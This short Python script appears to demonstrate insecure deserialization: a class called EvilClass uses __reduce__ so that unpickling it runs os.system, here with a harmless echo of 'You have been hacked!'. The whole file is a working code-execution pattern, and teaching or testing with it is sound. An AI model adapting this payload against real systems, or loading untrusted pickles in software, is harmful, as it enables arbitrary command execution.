import pickle
import os

class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked!"',))

def serialize_and_deserialize():
    evil = EvilClass()
    serialized_data = pickle.dumps(evil)
    deserialized_data = pickle.loads(serialized_data)
    return deserialized_data

serialize_and_deserialize()
